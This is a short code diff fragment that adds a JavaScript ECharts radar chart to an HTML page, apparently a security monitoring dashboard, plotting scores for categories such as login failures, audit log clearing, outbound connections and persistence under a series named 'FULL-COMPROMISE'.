+  const drill = echarts.init(document.getElementById('drillChart'));
+  drill.setOption({
+    tooltip: {},
+    radar: {
+      indicator: [
+        { name: '登录失败', max: 25 },
+        { name: '严重告警', max: 30 },
+        { name: '审计清除', max: 30 },
+        { name: '异常外连', max: 20 },
+        { name: '持久化', max: 20 },
+        { name: 'PS编码', max: 15 },
+        { name: '离线', max: 15 },
+      ],
+      center: ['50%', '48%'], radius: '70%',
+      axisName: { fontSize: 9, color: '#6b7280' },
+    },
+    series: [{
+      type: 'radar',
+      data: [{ value: [25, 30, 30, 15, 10, 8, 0], name: 'FULL-COMPROMISE' }],
+      areaStyle: { color: 'rgba(220,38,38,0.15)' },
+      lineStyle: { color: '#dc2626', width: 2 },
+      itemStyle: { color: '#dc2626' },
+    }]
+  });
+}
+
+setTimeout(renderCharts, 200);
+</script>
+</body>
+</html>
